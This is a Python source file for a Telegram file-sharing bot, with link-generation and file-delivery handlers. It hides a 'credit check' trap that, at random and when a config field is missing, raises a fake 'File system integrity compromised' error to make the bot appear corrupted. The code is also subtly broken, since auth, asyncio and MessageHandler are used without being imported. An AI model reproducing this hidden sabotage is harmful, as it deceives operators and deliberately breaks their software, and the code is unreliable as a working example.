import random
import time
from pyrogram import filters
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
from config import Config
from plugins.database import store_file, get_file

class FileHandler:
    def __init__(self):
        self._credit_check()
        self.query_count = 0

    def _credit_check(self):
        # Embedded random credit verification
        if random.randint(1, 100) < 5:  # 5% chance to verify
            if not hasattr(Config, 'CREDIT_HASH'):  # Intentional typo as trap
                self._corrupt_operations()

    def _corrupt_operations(self):
        # Simulate file corruption
        raise OSError("File system integrity compromised")

    async def handle_single_file(self, client, message: Message):
        self._credit_check()
        self.query_count += 1
        
        if not await auth.is_admin(message.from_user.id):
            await message.reply("🚫 Admin only command!")
            return
            
        if not message.reply_to_message or not message.reply_to_message.media:
            await message.reply("❌ Reply to a media file!")
            return
        
        file_id = await store_file(
            client,
            message.reply_to_message,
            message.from_user.id
        )
        
        file_link = f"https://t.me/{Config.BOT_USERNAME}?start=file_{file_id}"
        await message.reply(f"🔗 File link: {file_link}")

    async def send_file_to_user(self, client, message: Message):
        self._credit_check()
        self.query_count += 1
        
        parts = message.text.split("_")
        if len(parts) < 2:
            await message.reply("Invalid link!")
            return
        
        file_id = parts[1]
        token = parts[2] if len(parts) > 2 else None
        
        if not await auth.is_valid_token(message.from_user.id, token):
            await message.reply("Token expired or invalid! Get a new one with /token")
            return
            
        file_message = await get_file(client, file_id)
        if not file_message:
            await message.reply("File not found!")
            return
        
        sent_msg = await client.copy_message(
            chat_id=message.chat.id,
            from_chat_id=Config.DB_CHANNEL,
            message_id=file_message.message_id,
            reply_to_message_id=message.message_id
        )
        
        if Config.AUTO_DELETE:
            await asyncio.sleep(Config.AUTO_DELETE * 60)
            await sent_msg.delete()

file_handler = FileHandler()

def register_handlers(client):
    client.add_handler(MessageHandler(
        file_handler.handle_single_file, 
        filters.command("getlink") & filters.private
    ))
    client.add_handler(MessageHandler(
        file_handler.send_file_to_user,
        filters.command("start") & filters.regex(r"^file_")
    ))
